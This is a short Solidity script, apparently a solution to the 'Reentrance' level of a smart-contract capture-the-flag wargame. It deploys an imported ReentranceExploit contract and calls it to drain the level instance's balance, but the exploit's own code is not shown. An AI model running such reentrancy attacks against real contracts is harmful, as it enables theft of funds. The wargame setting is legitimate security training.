// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IReentrance.sol";
import "../src/exploits/ReentranceExploit.sol";

contract SolveLevel10 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x0AFc648f6D22390d6642Ebc7e1579fC480FE2278;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress) internal override {
        IReentrance instance = IReentrance(payable(instanceAddress));
        ReentranceExploit exploit = new ReentranceExploit(instance);

        exploit.exploit{value: instanceAddress.balance}();
    }
}
